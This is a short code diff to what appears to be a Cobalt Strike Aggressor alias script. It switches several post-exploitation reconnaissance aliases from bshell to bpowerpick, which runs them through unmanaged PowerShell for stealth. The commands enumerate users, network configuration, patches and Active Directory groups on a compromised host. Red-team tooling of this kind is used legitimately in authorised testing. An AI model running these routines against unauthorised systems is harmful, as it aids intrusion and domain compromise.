@@ -25,7 +25,7 @@ echo Home: %userprofile%
 echo Domain: %logonserver%
 """
 
-    aggressor.bshell(bid, command)
+    aggressor.bpowerpick(bid, command)
 
     aggressor.bps(bid)
     aggressor.bnet(bid, 'logons')
@@ -40,7 +40,7 @@ ipconfig /all 2>&1
 nslookup myip.opendns.com. resolver1.opendns.com
 """
 
-    aggressor.bshell(bid, command)
+    aggressor.bpowerpick(bid, command)
 
 @aliases.alias('patches', 'Get list of patches on system')
 def alias_patches(bid):
@@ -49,7 +49,7 @@ wmic os get Caption /value | more
 wmic qfe
 """
 
-    aggressor.bshell(bid, command)
+    aggressor.bpowerpick(bid, command)
 
 @aliases.alias('domain', 'Get domain info (output may be large)')
 def alias_domain(bid):
@@ -65,7 +65,7 @@ net group "Exchange Trusted Subsystem" /domain
 net accounts /domain
 """
 
-    aggressor.bshell(bid, command)
+    aggressor.bpowerpick(bid, command)
 
 @aliases.alias('apps', 'Get list of app uninstallers')
 def alias_apps(bid):
